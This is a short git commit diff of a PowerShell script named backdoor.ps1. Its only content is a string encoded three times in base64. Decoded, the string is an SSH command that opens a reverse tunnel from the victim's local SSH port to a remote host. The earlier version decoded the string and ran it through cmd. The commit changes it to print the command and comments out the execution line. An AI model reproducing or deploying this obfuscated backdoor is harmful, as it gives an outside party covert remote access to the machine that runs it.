d2e72441e2cf1a1784679d919397e7f9db5b7659
Guns51 <gunsalexandre@gmail.com>
2023-06-20 18:47:01 +0200

    d

--- backdoor.ps1
+++ backdoor.ps1
@@ -1,6 +1,7 @@
 ﻿$C = "WXpOT2IwbEhaREZpYms1b1VVUnJkMHhxUlhkUFV6UjVUWHByZFUxNlRXZE1Wa2xuVG1wWk1rNXFjSE5pTWs1b1lrZG9kbU16VVRaTmFrazk="
 
-$C = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($C))
-$C = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($C))
-$C = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($C))
-cmd -t($C)
+for ($i = 0; $i -lt 3; $i++) 
+{ $C = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($C)) }
+
+$C
+#cmd -t($C)
